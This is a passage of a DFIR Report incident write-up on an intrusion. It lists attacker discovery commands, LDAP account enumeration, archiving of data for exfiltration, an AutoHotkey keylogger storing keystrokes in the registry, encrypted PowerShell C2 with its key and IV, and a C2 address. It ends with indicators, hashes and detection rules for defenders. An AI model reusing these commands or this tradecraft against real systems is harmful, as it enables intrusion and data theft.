<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14486" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-013.png" alt width="1651" height="190" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-013.png 1651w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-013-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-013-1024x118.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-013-768x88.png 768w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-013-1536x177.png 1536w" sizes="(max-width: 1651px) 100vw, 1651px" /></a></p>
<p>During the intrusion, the threat actors executed the following for discovery tasks.</p>
<p>List disk information</p>
<pre class="wp-block-preformatted">"C:\Windows\System32\Wbem\WMIC.exe" logicaldisk</pre>
<p>List process</p>
<pre class="wp-block-preformatted">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command Get-Process</pre>
<p>Get information about Windows Defender service</p>
<pre class="wp-block-preformatted">"C:\Windows\system32\cmd.exe" /c sc query WinDefend</pre>
<p>Get current time on the victim&#8217;s workstation</p>
<pre class="wp-block-preformatted">"C:\Windows\system32\cmd.exe" /c time</pre>
<p>Get time zone</p>
<pre class="wp-block-preformatted">"C:\Windows\system32\cmd.exe" /c tzutil /g</pre>
<p>Use TRACERT in order to discover network infrastructure</p>
<pre class="wp-block-preformatted">"C:\Windows\system32\cmd.exe" /c tracert 8.8.8.8</pre>
<p>Enumerate local accounts</p>
<pre class="wp-block-preformatted">"C:\Windows\system32\net.exe" accounts </pre>
<p>Get information on current user</p>
<pre class="wp-block-preformatted">"C:\Windows\system32\whoami.exe" /all</pre>
<p>Enumerate files</p>
<pre class="wp-block-preformatted">get-childitem "C:\Program Files" | out-string
get-childitem "C:\Program Files (x86)" | out-string
get-childitem "C:\users" | out-string 
Get-ChildItem "C:\users\$env:username\desktop\" | out-string 
Get-ChildItem "C:\users\$env:username\downloads\" | out-string 
Get-ChildItem "C:\users\$env:username\documents\" | out-string 
Get-ChildItem $env:LOCALAPPDATA | out-string 
get-childitem "C:\Program Files" | out-string
get-childitem C:\ | out-string
get-childitem C:\users\%username%\downloads | out-string
get-childitem C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Default | out-string
get-childitem C:\Users\$env:username\AppData\Local\Microsoft\Edge\User Data\Default | out-string</pre>
<p>A PowerShell function based on the PowerSploit <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L3132" target="_blank" rel="noreferrer noopener">Convert-LDAPProperty</a> code was used in order to retrieve information on domain accounts:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14487" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-014.png" alt width="1996" height="1245" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-014.png 1996w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-014-300x187.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-014-1024x639.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-014-768x479.png 768w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-014-1536x958.png 1536w" sizes="(max-width: 1996px) 100vw, 1996px" /></a></p>
<p>Query AD &amp; SAM account name</p>
<pre class="wp-block-preformatted">$s = new-object -typename system.directoryservices.directorysearcher
$s.PageSize = 999999999
$s.Filter = '(&amp;(objectclass=computer))'
$s.findall() | % {$_.properties.samaccountname; $_.properties.operatingsystem}</pre>
<p>Computer and network information discovery</p>
<pre class="wp-block-preformatted">Get-ComputerInfo | out-string
Get-NetTCPConnection | out-string
Get-NetIPConfiguration -All | Out-String</pre>
<p>Get the account information for logged-on user of a Windows machine</p>
<pre class="wp-block-preformatted">Get-WmiObject –ComputerName [REDACTED] –Class Win32_ComputerSystem | Select-Object UserName</pre>
<p>Gets the status of antimalware software on the computer.</p>
<pre class="wp-block-preformatted">Get-MpComputerStatus	</pre>
<p>List environment variables</p>
<pre class="wp-block-preformatted">ls $env:temp
get-childitem $env:temp | out-string</pre>
<p>Get public IP address</p>
<pre class="wp-block-preformatted">Invoke-WebRequest -UseBasicParsing -Uri http://ident.me | out-string</pre>
<h2 class="wp-block-heading" id="collection"><a href="#collection">Collection</a></h2>
<p>Before exfiltration, the data collected from LDAP discovery was written out to an XML file. </p>
<pre class="wp-block-preformatted">Compress-Archive -Path c:\users\public\u.xml -DestinationPath c:\users\public\u.zip -CompressionLevel Optimal</pre>
<p>Threat actors also dropped and executed a PowerShell script using their <code>temp.ps1</code> C2 script:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14488" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-015.png" alt width="507" height="170" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-015.png 507w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-015-300x101.png 300w" sizes="(max-width: 507px) 100vw, 507px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14489" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-016.png" alt width="1324" height="205" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-016.png 1324w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-016-300x46.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-016-1024x159.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-016-768x119.png 768w" sizes="(max-width: 1324px) 100vw, 1324px" /></a></p>
<p>The <code>sc.ps1</code> file contained PowerShell code to capture a screenshot of the system. The screenshots were taken upon the execution of this PowerShell script and then they were saved in the same directory as <code>sc.png</code> files.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14491" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-025.png" alt width="767" height="810" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-025.png 767w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-025-284x300.png 284w" sizes="(max-width: 767px) 100vw, 767px" /></a></p>
<p>A scheduled task named <code>MicrosoftEdgeUpdateTaskMachineUC</code> was created by the threat actors. The program executed by this task was a keylogger. This keylogger relied on the files module.exe, module.ahk, and readkey.ps1<strong>.</strong> The file t.xml contained the task used to execute these files.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14490" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-017.png" alt width="904" height="381" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-017.png 904w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-017-300x126.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-017-768x324.png 768w" sizes="(max-width: 904px) 100vw, 904px" /></a></p>
<p>The executable, module.exe, is a renamed binary of AutoHotkey. This is one of the ways in which you can execute an AutoHotkey (AHK) script.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14492" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-026.png" alt width="614" height="307" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-026.png 614w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-026-300x150.png 300w" sizes="(max-width: 614px) 100vw, 614px" /></a></p>
<p>The actual keylogger is the AHK script, module.ahk.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14493" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-018.png" alt width="1057" height="1174" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-018.png 1057w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-018-270x300.png 270w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-018-922x1024.png 922w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-018-768x853.png 768w" sizes="(max-width: 1057px) 100vw, 1057px" /></a></p>
<p>Navigating through the AHK script, we discovered artifacts of acquiring the keyboard layout and capturing pressed keys. In addition, we notice there is a function named <code>UpdateReg</code> that accepts a text parameter. This registry key is also found within the readkey.ps1 script and turns out to be where the keylogger saved captured keystrokes.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14494" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-019.png" alt width="796" height="98" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-019.png 796w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-019-300x37.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-019-768x95.png 768w" sizes="(max-width: 796px) 100vw, 796px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14495" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-020.png" alt width="890" height="427" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-020.png 890w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-020-300x144.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-020-768x368.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></a></p>
<p>The<strong> readkey.ps1</strong> file grabbed the keystrokes from the <code>KeypressValue</code> registry key, XOR&#8217;s the data, and saves it to a log (logFileuyovaqv.bin) file.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14496" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-021.png" alt width="873" height="530" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-021.png 873w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-021-300x182.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-021-768x466.png 768w" sizes="(max-width: 873px) 100vw, 873px" /></a></p>
<p>The threat actors then made a cab file out of the collected keystrokes in preparation for exfiltration.</p>
<pre class="wp-block-preformatted">makecab "C:\Users\&lt;REDACTED&gt;\AppData\Local\Temp\logFileuyovaqv.bin" C:\Users\&lt;REDACTED&gt;\AppData\Local\Temp\logFileuyovaqv.cab</pre>
<h2 class="wp-block-heading" id="command-and-control"><a href="#command-and-control">Command and Control</a></h2>
<p>Activity to the C2 is established via execution of the Script.ps1 and temp.ps1 files. Communication between the victim and C2 is encrypted using AES-CBC with the following Key and IV:</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Key</td>
<td>17 1d 84 e8 41 ae e4 c0 ff fb a2 7c 86 d1 ec 82 b8 80 7c b8 c3 79 9a 11 b8 fa 2d b7 78 1f d1 5a</td>
</tr>
<tr>
<td>IV</td>
<td>18 3c ed 6f b3 34 9f 9a c6 f9 08 f9 29 de 35 52</td>
</tr>
</tbody>
</table>
</figure>
<p>First communication to the C2 (hxxp[:]//45[.]89[.]125[.]189/get) began on day one and beaconed in roughly 10-minute increments. All requests return a 502 Bad Gateway error until day two.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14497" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-022.png" alt width="1029" height="843" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-022.png 1029w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-022-300x246.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-022-1024x839.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-022-768x629.png 768w" sizes="(max-width: 1029px) 100vw, 1029px" /></a></p>
<p>First C2 communication breakdown:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14498" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-023.png" alt width="1044" height="432" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-023.png 1044w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-023-300x124.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-023-1024x424.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-023-768x318.png 768w" sizes="(max-width: 1044px) 100vw, 1044px" /></a></p>
<p>AES encrypted PowerShell command example:</p>
<pre class="wp-block-preformatted">0!@#EWQ654!@#EWQpowershell -command Get-Process^%$RTY:</pre>
<p>SafeBreach published similar findings from this C2 infrastructure, where they described the format in detail. You can review their research <a href="https://www.safebreach.com/resources/blog/safebreach-labs-researchers-uncover-new-fully-undetectable-powershell-backdoor/" target="_blank" rel="noreferrer noopener">here</a>.</p>
<h2 class="wp-block-heading" id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>
<p>Several files collected during discovery tasks, such as domain user account information and later the keylogger collected data, were exfiltrated to the C2 server via POST requests.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14499" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-024.png" alt width="1069" height="120" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-024.png 1069w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-024-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-024-1024x115.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-024-768x86.png 768w" sizes="(max-width: 1069px) 100vw, 1069px" /></a></p>
<h2 class="wp-block-heading" id="impact"><a href="#impact">Impact</a></h2>
<p>During the intrusion, no final actions beyond data collection and discovery tasks were observed.</p>
<h2 class="wp-block-heading" id="indicators"><a href="#indicators"><strong>Indicators</strong></a></h2>
<h3 class="wp-block-heading">Atomic</h3>
<pre class="wp-block-preformatted">45.89.125.189
http://45.89.125[.]189/get
http://45.89.125[.]189/put</pre>
<h3 class="wp-block-heading">Computed</h3>
<pre class="wp-block-preformatted">t.xml
691332c86dd568f87b7fff4601c37895
0b676ea2ad205b70b9feb1eedbfdec72137e08e5
7ae52c0562755f909d5d79c81bb99ee2403f2c2ee4d53fd1ba7692c8053a63f6

readkey.ps1
fc5f490dbe375779b2c6bbccdd869ca6
b8c8171b6e8efd2bb0ae8d5b22749564edd38109
eb2a94ee29d902c8a13571ea472c80f05cfab8ba4ef80d92e333372f4c7191f4

module.exe
9a7d5f126904adc194df4dcbc2c5715c
a86088cf31c72cc4648ee8dfa082979a74044203
b92be3d086372fc89b3466e8d9707de78a5b6dff3e4a2eecc92c01d55a86fd7d

module.ahk
c65b10c1113c0f0d4e06609fa60d9aad
2ca263fc5f1e505c1839ab0abf56571af6c7809d
e4b2411286d32e6c6d3d7abffc70d296c814e837ef14f096c829bf07edd45180

Apply_Form.docm
f769f67681707e8f69ecdf9e62fb944c
c5f6a48fa52a279e1f3424b97662b479716229af
45f293b1b5a4aaec48ac943696302bac9c893867f1fc282e85ed8341dd2f0f50

sc.ps1
34a2677a7776f87e810814c2d3845f47
79b1f6b0afe943a60560eb20677d5b801dc29ba3
ac933ffc337d13b276e6034d26cdec836f03d90cb6ac7af6e11c045eeae8cc05

logFileuyovaqv.bin
f7611e77c5f99b81085e61b17b969afe
475320a5bf0ba52fc9ff711d8e6dba512b3fefbf
d4857156094963c8e38f6e88f4d72cb910aa537e3811eae0579f7abc568c9ae8

Updater.vbs
850b8d07180601417193a6f88227130a
e1f4a8e434638c56b7a0d2d0317f4d0d84987a40
be0e75d50565506baa1ce24301b702989ebe244b3a1d248ee5ea499ba812d698

temp.ps1
c3aedb781a5b96674764cd43ef076d10
86da0100bb6a07a89eaa4dc3ec220e9dbd6ecf71
16007ea6ae7ce797451baec2132e30564a29ee0bf8a8f05828ad2289b3690f55

Script.ps1
a3c14604fb4454ba5722f07f89780e73
ed7b9ddbaee794cecb80fac794b0e6cb0ae073b5
bda4484bb6325dfccaa464c2007a8f20130f0cf359a7f79e14feeab3f</pre>
<h2 class="wp-block-heading" id="detections"><a href="#detections">Detections</a></h2>
<h3 class="wp-block-heading">Network</h3>
<pre class="wp-block-preformatted">ET MALWARE TA452 Related Backdoor Activity (POST)
ET MALWARE TA452 Related Backdoor Activity (GET)
ET INFO Windows Powershell User-Agent Usage</pre>
<h3 class="wp-block-heading">Sigma</h3>
<p><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_renamed_autohotkey_binary.yml" target="_blank" rel="noopener">https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_renamed_autohotkey_binary.yml</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_schtasks_env_folder.yml" target="_blank" rel="noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_schtasks_env_folder.yml</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml" target="_blank" rel="noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ps_appdata.yml" target="_blank" rel="noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ps_appdata.yml</a></p>
<h3 class="wp-block-heading">Yara</h3>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/17333/17333.yar" target="_blank" rel="noopener">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/17333/17333.yar</a></p>
<h2 class="wp-block-heading">MITRE</h2>
<pre class="wp-block-preformatted">PowerShell – T1059.001
Malicious File – T1204.002
Domain Account – T1087.002
System Information Discovery – T1082
Process Discovery – T1057
System Owner/User Discovery – T1033
System Network Connections Discovery – T1049
Scheduled Task/Job – T1053
Screen Capture – T1113
Keylogging – T1056.001
Symmetric Cryptography – T1573.001
Archive via Utility – T1560.001
Security Software Discovery – T1518.001
File and Directory Discovery – T1083
System Time Discovery – T1124
System Service Discovery – T1007
Modify Registry – T1112 </pre>
<p>Internal case #17333</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-14465" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-14465" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-14465" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2023/01/23/sharefinder-how-threat-actors-discover-file-shares/" rel="prev">ShareFinder: How Threat Actors Discover File Shares</a></div><div class="nav-next"><a href="https://thedfirreport.com/2023/03/06/2022-year-in-review/" rel="next">2022 Year in Review</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block"> <div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="175340963" data-post_access_level="everybody" data-subscriber_email id="subscribe-blog">
<div class="wp-block-jetpack-subscriptions__form-elements">
<p id="subscribe-email">
<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
Type your email… </label>
<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your email…" value id="subscribe-field" title="Please fill in this field." /> </p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="blog_id" value="175340963" />
<input type="hidden" name="source" value="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/" />
<input type="hidden" name="sub-type" value="subscribe-block" />
<input type="hidden" name="app_source" value />
<input type="hidden" name="redirect_fragment" value="subscribe-blog" />
<input type="hidden" name="lang" value="en_US" />
<input type="hidden" id="_wpnonce" name="_wpnonce" value="2bedf18890" /><input type="hidden" name="_wp_http_referer" value="/2023/02/06/collect-exfiltrate-sleep-repeat/" /><input type="hidden" name="post_id" value="14465" /> <button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</div>
</form>
</div>
</div>
</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
</div>
<script type="0d6d1317a6f763bca75e4b49-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2023\/02\/06\/collect-exfiltrate-sleep-repeat\/":14465};
	</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form 